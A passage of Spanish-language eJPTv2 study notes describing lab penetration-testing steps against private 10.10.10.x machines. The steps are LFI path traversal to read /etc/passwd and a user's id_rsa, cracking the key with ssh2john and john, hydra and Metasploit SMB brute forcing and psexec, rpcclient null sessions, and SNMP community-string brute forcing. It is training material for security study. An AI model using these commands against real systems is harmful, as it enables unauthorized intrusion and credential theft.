Ahora cargaremos los dos archivos y veremos cuál nos permite obtener un shell inverso.  

![76](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/76.jpg)    


Una vez cargados los archivos, abrimos un shell y escuchamos en el puerto 6969 (el que se usa al crear el payload con msfvenom) y vemos qué pasa.  

Con el primer payload, obtenemos un error.    

![77](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/77.jpg)   

Con la segunda, sin embargo, obtenemos una cáscara inversa.  

![78](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/78.jpg)     

Entonces habrá que tratar el tty para que funcione más cómodamente.   

![79](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/79.jpg)   

#Exploitation vulnerabilità local file inclusion (LFI)  
Para entender cómo funciona esta vulnerabilidad, supongamos que después de realizar los escaneos pertinentes con nmap y fuzzing, accedemos a una página como esta.  

![80](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/80.jpg)    

![81](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/81.jpg)    

Si abrimos la página /tools y analizamos el código fuente de la página con Ctrl + U vemos un comentario que nos puede llamar la atención.  

![82](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/82.jpg)   

Lo que puedo hacer es intentar abrir la página /tools añadiendo la cadena que vemos comentada en verde.    

![83](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/83.jpg)   

Y vemos que realmente se abre una página.  

![84](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/84.jpg)   

Cuando veamos una página del tipo «doc=» lo que podemos intentar es «retroceder» un nivel para ver si podemos leer por ejemplo el fichero /etc/passwd, si estamos en una máquina Linux.  
Para ello basta con insertar una serie de «../../../../../../../../etc/passwd» después de «=».    

![85](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/85.jpg)      

![86](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/86.jpg)   

y efectivamente la máquina es vulnerable.  
Ahora sabemos que hay un usuario gh0st, así que podemos intentar ver si en su home, en la carpeta oculta .ssh, está la clave id_rsa que podría permitirnos conectarnos.  

![87](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/87.jpg)   

Y sí, podemos ver la clave id_rsa (para verla mejor podemos teclear Ctrl + u).  

![88](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/88.jpg)   

Copiamos la clave y creamos un nuevo documento en la máquina atacante, que llamaremos «clave.rsa».  
Ahora podemos intentar conectarnos a la máquina pasándole la clave rsa que acabamos de crear con el comando:  

`sudo ssh -i key.rsa gh0st@10.10.10.16`   

![89](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/89.jpg)    

Vemos que se nos pide una contraseña. 
Y aquí es donde entra ssh2john. 
Su uso es muy sencillo. 
De hecho escribiremos: 

`sudo ssh2john key.rsa > hash`  

que creará el archivo hash, tras lo cual se lo pasaremos a john para que intente descifrar la contraseña con el comando:  

`sudo john --wordlist=/usr/share/wordlists/rockyou.txt hash`  

Y listo    

![90](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/90.jpg)    

Ahora podemos intentar conectarnos con el comando visto anteriormente, y cuando nos pida una contraseña introducimos 'celtic':  

`sudo ssh -i key.rsa gh0st@10.10.10.16`  

# Enumeración y explotación básica del protocolo SMB (puerto 445) 
Cuando veo un puerto 445 abierto, puedo intentar enumerar los recursos escribiendo este comando:  

`sudo smbclient -L 10.10.10.5 -N`  

El parámetro `-N` indica que quiero usar una "sesión nula", es decir, que no tengo conocimiento del nombre de usuario ni de la contraseña.  
En caso de que conociéramos el nombre de usuario (mario en este ejemplo), podría ejecutar el siguiente comando:  

`sudo hydra -l mario -P /usr/share/wordlists/rockyou.txt smb://10.10.10.5`  

![91](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/91.jpg)   

Ahora que tenemos la contraseña, si queremos iniciar una sesión SMB, deberemos escribir el siguiente comando:  

`sudo smbclient -L //10.10.10.5 -U 'mario'`  

 y una vez que introduzco la contraseña (123123 en este ejemplo) obtengo una lista de los recursos compartidos de la máquina víctima:  

![92](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/92.jpg)   

Sin embargo, si quisiera saber los permisos, es decir, en qué carpeta puedo entrar o no, tendría que utilizar la herramienta smbmap, escribiendo el comando:  

`sudo smbmap -H 10.10.10.5 -u 'mario' -p '123123'`   

![93](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/93.jpg)  

Si ahora quiero acceder a un recurso compartido, tendré que teclear:  

`sudo smbclient -U 'mario' //10.10.10.5/Users`  

Y voila, así puedo entrar en la máquina y teclear comandos como «dir, cd etc».  

![94](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/94.jpg)  

# Enumeración y explotación básica del protocolo SMB con Metasploit  
Con el módulo 'smblogin' puedo realizar ataques de fuerza bruta o iniciar una sesión smb.  
El módulo se encuentra en auxiliary/scanner/smb/smb_login.  
Una vez seleccionado, como siempre, teclearé el comando 'show options' y estableceré los parámetros adecuados.    

![95](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/95.jpg)   

![96](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/96.jpg)    

CONSEJOS
Pon el parámetro VERBOSE a false para que se ejecute un poco más rápido.  

Una vez que tengo la contraseña, puedo intentar iniciar una sesión smb con el módulo  
exploit/windows/smb/psexec.  
Como siempre configuro las opciones y pruebo a ver si funciona. 
Puede funcionar o no, es cuestión de probar.  

![97](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/97.jpg)    

# Enumeración de usuarios SAMBA y uso de RPCCLIENT 
Supongamos que tenemos una máquina con el servicio samba activo.  
Una cosa que puedo intentar hacer es intentar enumerar los usuarios existentes.  
Puedo usar el comando  

`sudo rpcclient -U "" -N 10.10.10.17`  

Una vez ejecutado, se abre una consola donde puedo teclear 3 comandos básicos para la enumeración, que son:  
**srvinfo** 
**querydispinfo** 
**enumdomusers**    

![98](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/98.jpg)    

Como puedo ver en este caso he obtenido dos nombres de usuario, por lo que llegados a este punto podría intentar un ataque de fuerza bruta con Hydra o con Metasploit.  
Con este último por ejemplo puedo utilizar el módulo smb_login visto anteriormente y tras configurar las opciones ejecutarlo.  

![99](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/99.jpg)   

![100](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/100.jpg)    

# Enumeración y explotación del protocolo SNMP  
Supongamos que hago un escaneo nmap de los puertos UDP y encuentro el puerto 161 (SNMP) abierto.  
Una cosa que puedo hacer es utilizar 2 herramientas que me pueden ayudar a obtener información importante.  

**ONESIXTYONE**  
Puedo utilizar este comando para intentar obtener la 'clave de comunidad' que es esencial para continuar con otros escaneos.  

`sudo onesuxtyone -c /usr/share/wordlists/rockyou.txt 10.10.10.18 `  

![101](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/101.jpg)  

**SNMPWALK**  

Una vez obtenida la clave de comunidad, que en este ejemplo es 'security', puedo utilizar esta herramienta para obtener otra información.  
Emitiré el comando  

`sudo snmpwalk -v 2c -c security 10.10.10.18`  

![102](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/102.jpg)   

Como puedes ver, conseguí un nombre de dominio, así que ahora puedo poner este dominio en el fichero hosts  

![103](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/103.jpg)     

y enumerarlo con wfuzz tecleando el comando: 

`sudo wfuzz -c -L --hc=404 --hl=11 -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "HOST: FUZZ.chaincorp.nyx" -u 10.10.10.18`  

![104](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/104.jpg)    

Entonces encontraría un dominio utils, y editando de nuevo el fichero hosts, también podría acceder a este dominio y continuar la enumeración.  

![105](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/105.jpg)  










































































































































































  






































































